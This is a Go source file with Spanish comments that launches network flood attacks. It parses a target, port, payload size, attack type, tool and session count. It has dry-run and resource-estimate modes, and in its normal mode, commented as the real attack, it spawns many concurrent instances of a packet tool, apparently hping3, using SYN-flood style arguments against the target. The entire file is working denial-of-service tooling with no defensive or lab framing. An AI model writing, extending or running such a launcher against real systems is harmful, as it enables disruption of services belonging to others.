package main

import (
    "flag"
    "fmt"
    "os"
    "os/exec"
    "strconv"
    "strings"
)

// getMemAvailable lee /proc/meminfo para obtener memoria disponible en bytes
func getMemAvailable() uint64 {
    data, err := os.ReadFile("/proc/meminfo")
    if err != nil {
        return 0
    }
    lines := strings.Split(string(data), "\n")
    for _, line := range lines {
        if strings.HasPrefix(line, "MemAvailable:") {
            fields := strings.Fields(line)
            val, _ := strconv.ParseUint(fields[1], 10, 64)
            return val * 1024 // kB a bytes
        }
    }
    return 0
}

func main() {
    dryOut := flag.Bool("dry-out", false, "Enable dry-run mode")
    memReq := flag.Bool("mem-req", false, "Enable memory requirement check")
    flag.Parse()

    args := flag.Args()
    if len(args) < 7 {
        fmt.Println("Usage: go run runtime.go [--dry-out] [--mem-req] <Target> <Port> <FileSize> <AttackType> <Tool> <Interval> <Sessions>")
        return
    }

    Target := args[0]
    Port := args[1]
    FileSize := args[2]
    AttackType := args[3]
    Tool := args[4]
    Interval := args[5]
    SessionsStr := args[6]

    numSessions, err := strconv.Atoi(SessionsStr)
    if err != nil {
        fmt.Println("Error: Sessions must be an integer")
        return
    }

    fileSizeBytes, err := strconv.Atoi(FileSize)
    if err != nil {
        fmt.Println("Error: FileSize must be an integer")
        return
    }

    // Modo dry-run
    if *dryOut {
        fmt.Printf("[dry-run] Would launch %s attack with tool %s\n", AttackType, Tool)
        fmt.Printf("[dry-run] Target: %s, Port: %s, FileSize: %s, Interval: %s, Sessions: %s\n",
            Target, Port, FileSize, Interval, SessionsStr)
        return
    }

    // Modo memory requirement
    if *memReq {
        fmt.Printf("[mem-req] Estimating memory and CPU for %d sessions\n", numSessions)
        fmt.Printf("[mem-req] Target: %s, Port: %s, FileSize: %s, Interval: %s, AttackType: %s, Tool: %s\n",
            Target, Port, FileSize, Interval, AttackType, Tool)

        // Obtener memoria disponible
        memAvailable := getMemAvailable()
        fmt.Printf("[mem-req] Available memory: %d bytes (~%.2f MB)\n", memAvailable, float64(memAvailable)/(1024*1024))

        // Estimar memoria requerida (simplificado: cada sesión consume FileSize + overhead de 1MB)
        overheadPerSession := 1024 * 1024 // 1MB por sesión
        memRequired := uint64(numSessions*fileSizeBytes) + uint64(numSessions*overheadPerSession)
        fmt.Printf("[mem-req] Estimated memory required: %d bytes (~%.2f MB)\n", memRequired, float64(memRequired)/(1024*1024))

        if memRequired > memAvailable {
            fmt.Println("[mem-req] Warning: Not enough memory for all sessions!")
        } else {
            fmt.Println("[mem-req] Enough memory available.")
        }

        // Estimar carga de CPU (simplificada)
        cpuPerSession := 5.0 // suponemos 5% por sesión como estimación
        totalCPU := cpuPerSession * float64(numSessions)
        fmt.Printf("[mem-req] Estimated CPU usage: %.2f%%\n", totalCPU)
        if totalCPU > 100 {
            fmt.Println("[mem-req] Warning: CPU usage may exceed 100%!")
        }

        return
    }

    // Ejecución normal (ataque real)
    var cmdArgs []string
    switch strings.ToLower(AttackType) {
    case "flood":
        cmdArgs = []string{"-S", Target, "-p", Port, "--data", FileSize}
        if Interval != "" {
            cmdArgs = append(cmdArgs, "-i", Interval)
        }
    default:
        cmdArgs = []string{Target, "-p", Port, "--data", FileSize, "-t", AttackType}
        if Interval != "" {
            cmdArgs = append(cmdArgs, "-i", Interval)
        }
    }

    for i := 0; i < numSessions; i++ {
        cmd := exec.Command(Tool, cmdArgs...)
        cmd.Stdout = os.Stdout
        cmd.Stderr = os.Stderr
        if err := cmd.Start(); err != nil {
            fmt.Printf("Error launching session %d: %v\n", i+1, err)
        } else {
            fmt.Printf("Session %d started (PID %d)\n", i+1, cmd.Process.Pid)
        }
    }
}
